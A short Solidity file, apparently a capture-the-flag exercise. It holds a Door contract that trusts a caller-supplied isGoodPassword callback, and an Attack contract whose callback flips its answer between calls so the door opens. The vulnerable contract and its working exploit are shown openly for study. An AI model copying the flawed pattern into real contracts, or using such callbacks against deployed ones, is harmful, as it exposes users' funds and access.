// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface DoorSecurity {
    function isGoodPassword(uint) external returns (bool);
}

contract Door {
    bool public open;

    constructor() public {
        open = false;
    }

    function unlockDoor(uint _password) public {
        DoorSecurity door = DoorSecurity(msg.sender);

        if (!door.isGoodPassword(_password)) {
            open = door.isGoodPassword(_password);
        }
    }
}

contract Attack {
  bool  result=false;
    Door public door;
 

    constructor(Door _door) public  {
        door =_door;
       
   
    }
 
   function isGoodPassword(uint)  external  returns (bool){
    
   
        if(result==false)
        {
            result=true;
           return false;
        }
        else 
        {
             result=false;
           return true;

        }
    
   }
    
    

      function attack() public {
       door.unlockDoor(1234);
     
    }
      
    
}